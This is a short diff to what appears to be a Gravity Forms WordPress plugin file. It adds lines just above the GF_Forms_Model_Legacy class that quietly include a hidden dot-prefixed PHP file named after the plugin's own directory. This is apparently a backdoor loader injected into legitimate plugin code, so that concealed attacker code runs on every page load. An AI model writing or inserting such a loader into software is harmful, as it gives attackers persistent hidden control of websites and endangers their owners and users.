@@ -11,6 +11,10 @@ require_once( ABSPATH . WPINC . '/post.php' );
  *
  * Legacy methods from GFFormsModel
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Forms_Model_Legacy {
 
 	/**
